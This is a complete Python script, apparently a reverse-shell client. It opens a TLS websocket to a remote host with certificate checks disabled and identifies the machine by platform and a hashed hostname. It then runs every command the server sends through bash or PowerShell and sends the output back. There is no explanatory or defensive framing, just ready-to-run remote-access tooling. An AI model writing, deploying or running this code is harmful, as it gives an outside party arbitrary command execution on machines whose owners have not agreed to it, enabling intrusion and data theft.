import asyncio, subprocess, websockets, ssl, sys, socket, hashlib

def run_command(command, shell_type="bash"):
    """ Run a given command in a shell. """
    if sys.platform == "win32":
        shell_type = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" 
    process = subprocess.Popen(command, shell=True, executable=shell_type, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate()
    return stdout, stderr

async def connect_to_server(ip, port):
    """ Connection handler. Sends and receives messages. """
    ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE  # Disable verification
    key = f"py_{sys.platform }_{hashlib.md5(socket.gethostname().encode()).hexdigest()}"
    uri = f"wss://{ip}:{port}/{key}"
    try:
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            await websocket.send(key)
            while True:
                stdout, stderr, exception = None, None, None
                command = await websocket.recv()
                try: stdout, stderr = run_command(command)
                except Exception as e: exception = str(e)
                finally: await websocket.send((stderr or stdout or exception or '').rstrip('\n'))
    except websockets.exceptions.ConnectionClosedOK:
        print("Connection closed gracefully.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == '__main__':
    asyncio.run(connect_to_server(sys.argv[1], sys.argv[2]))
